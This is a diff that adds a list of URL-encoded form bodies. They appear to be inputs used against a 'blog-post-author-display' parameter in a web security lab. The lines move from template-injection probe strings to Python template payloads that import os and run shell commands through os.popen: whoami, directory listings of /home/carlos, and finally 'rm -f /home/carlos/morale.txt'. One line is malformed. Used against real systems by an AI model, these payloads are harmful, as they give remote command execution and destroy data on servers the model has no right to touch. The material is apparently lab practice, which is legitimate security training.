@@ -1,0 +1,10 @@
+blog-post-author-display=${{<%25[%25'"}}%25\&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=abc}<tag>&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=abc}}<tag>&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("whoami").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("ls+-l+/home").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("ls+-l+/home/carlos").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("r/home/carlos").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("file+/home/carlos/morale.txt").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("rm+-f+/home/carlos/morale.txt").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
